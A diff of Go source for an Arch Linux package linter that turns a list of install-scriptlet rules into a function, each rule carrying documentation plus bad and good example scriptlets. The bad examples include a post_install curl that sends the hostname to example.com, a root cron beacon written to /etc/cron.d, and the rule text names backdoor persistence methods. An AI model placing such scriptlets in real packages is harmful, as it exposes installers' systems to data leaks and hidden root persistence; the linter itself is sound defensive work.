@@ -14,88 +14,90 @@ import (
 // more harshly than in the build itself. The exec/obfuscation rules (PB3xx)
 // and filesystem rules (PB4xx) also run over scriptlets; the rules here are
 // scriptlet-specific.
-var scriptletRules = []Rule{
-	{
-		ID:       "PB501",
-		Name:     "network-in-scriptlet",
-		Severity: Critical,
-		Doc: "Install scriptlets run as root during pacman transactions. A scriptlet that talks " +
-			"to the network executes unreviewable remote input at the worst possible moment — " +
-			"this is how the 2018 acroread AUR compromise delivered its payload.",
-		Check: checkScriptletNetwork,
-		Bad: `post_install() {
+func scriptletRules() []Rule {
+	return []Rule{
+		{
+			ID:       "PB501",
+			Name:     "network-in-scriptlet",
+			Severity: Critical,
+			Doc: "Install scriptlets run as root during pacman transactions. A scriptlet that talks " +
+				"to the network executes unreviewable remote input at the worst possible moment — " +
+				"this is how the 2018 acroread AUR compromise delivered its payload.",
+			Check: checkScriptletNetwork,
+			Bad: `post_install() {
   curl -fsSL https://example.com/register?host=$(hostname)
 }`,
-		Good: `post_install() {
+			Good: `post_install() {
   echo "Run 'foo --setup' to finish configuration."
 }`,
-	},
-	{
-		ID:       "PB502",
-		Name:     "scriptlet-persistence",
-		Severity: Warn, MaxSeverity: Critical, // critical for crontabs and other persistence writes
-		Doc: "Files a package ships belong in package(), tracked and removed by pacman. A " +
-			"scriptlet that edits crontabs, systemd units, shell profiles or autostart entries, or " +
-			"creates login-capable users, is installing untracked persistence — a classic backdoor " +
-			"pattern. So is one that sets a password non-interactively (chpasswd, `passwd` fed on " +
-			"stdin), puts an account in wheel, or edits sshd_config: that is a way back in, the shape " +
-			"of the x11-qemu-validation incident of September 2026.",
-		Check: checkScriptletPersistence,
-		Bad: `post_install() {
+		},
+		{
+			ID:       "PB502",
+			Name:     "scriptlet-persistence",
+			Severity: Warn, MaxSeverity: Critical, // critical for crontabs and other persistence writes
+			Doc: "Files a package ships belong in package(), tracked and removed by pacman. A " +
+				"scriptlet that edits crontabs, systemd units, shell profiles or autostart entries, or " +
+				"creates login-capable users, is installing untracked persistence — a classic backdoor " +
+				"pattern. So is one that sets a password non-interactively (chpasswd, `passwd` fed on " +
+				"stdin), puts an account in wheel, or edits sshd_config: that is a way back in, the shape " +
+				"of the x11-qemu-validation incident of September 2026.",
+			Check: checkScriptletPersistence,
+			Bad: `post_install() {
   systemctl enable foo-telemetry.timer
   echo '* * * * * root /opt/foo/beacon' >> /etc/cron.d/foo
 }`,
-		Good: `post_install() {
+			Good: `post_install() {
   echo "Enable the service with: systemctl enable foo.service"
 }`,
-	},
-	{
-		ID:       "PB503",
-		Name:     "unparseable-scriptlet",
-		Severity: Error,
-		Doc: "An install scriptlet pkglint cannot read or parse is analyzed by no rule, yet its code " +
-			"still runs as root at install time. A parse failure usually means the file is malformed " +
-			"or deliberately obfuscated to defeat static analysis; either way it must be reviewed by hand.",
-		Check: checkScriptletParseError,
-		Bad: `# foo.install with an unterminated function — makepkg still runs it as root:
+		},
+		{
+			ID:       "PB503",
+			Name:     "unparseable-scriptlet",
+			Severity: Error,
+			Doc: "An install scriptlet pkglint cannot read or parse is analyzed by no rule, yet its code " +
+				"still runs as root at install time. A parse failure usually means the file is malformed " +
+				"or deliberately obfuscated to defeat static analysis; either way it must be reviewed by hand.",
+			Check: checkScriptletParseError,
+			Bad: `# foo.install with an unterminated function — makepkg still runs it as root:
 post_install() {
   echo installing
 # (missing closing brace)`,
-		Good: `post_install() {
+			Good: `post_install() {
   echo installing
 }`,
-	},
-	{
-		ID:       "PB504",
-		Name:     "hook-covered-command",
-		Severity: Info,
-		Doc: "pacman has run update-desktop-database, gtk-update-icon-cache, fc-cache and friends " +
-			"automatically via alpm hooks since version 5.0. Calling them from a scriptlet is dead " +
-			"code at best and shadows the hook's transaction-wide batching at worst; usually the " +
-			"whole scriptlet can be deleted.",
-		Check: checkHookCoveredCommands,
-		Bad: `post_install() {
+		},
+		{
+			ID:       "PB504",
+			Name:     "hook-covered-command",
+			Severity: Info,
+			Doc: "pacman has run update-desktop-database, gtk-update-icon-cache, fc-cache and friends " +
+				"automatically via alpm hooks since version 5.0. Calling them from a scriptlet is dead " +
+				"code at best and shadows the hook's transaction-wide batching at worst; usually the " +
+				"whole scriptlet can be deleted.",
+			Check: checkHookCoveredCommands,
+			Bad: `post_install() {
   gtk-update-icon-cache -q /usr/share/icons/hicolor
 }`,
-		Good: `post_install() {
+			Good: `post_install() {
   echo "run 'demo --setup' once to finish configuration"
 }`,
-	},
-	{
-		ID:       "PB505",
-		Name:     "pacman-in-scriptlet",
-		Severity: Error,
-		Doc: "A scriptlet runs inside the pacman transaction that is installing its package, with " +
-			"the database lock held, so a `pacman -S`, `-U` or `-R` from it cannot do what it says: " +
-			"it fails on the lock, or, run detached until the lock clears, installs or removes " +
-			"packages the user never saw in the transaction summary. Dependencies belong in " +
-			"depends=; read-only queries (`pacman -Q`) are fine.",
-		Check: checkScriptletPacman,
-		Bad: `post_install() {
+		},
+		{
+			ID:       "PB505",
+			Name:     "pacman-in-scriptlet",
+			Severity: Error,
+			Doc: "A scriptlet runs inside the pacman transaction that is installing its package, with " +
+				"the database lock held, so a `pacman -S`, `-U` or `-R` from it cannot do what it says: " +
+				"it fails on the lock, or, run detached until the lock clears, installs or removes " +
+				"packages the user never saw in the transaction summary. Dependencies belong in " +
+				"depends=; read-only queries (`pacman -Q`) are fine.",
+			Check: checkScriptletPacman,
+			Bad: `post_install() {
   pacman -S --noconfirm --asdeps python-requests
 }`,
-		Good: `depends=('python-requests')   # pacman resolves it in the same transaction`,
-	},
+			Good: `depends=('python-requests')   # pacman resolves it in the same transaction`,
+		},
+	}
 }
 
 func checkScriptletPacman(ctx *Context) []Finding {
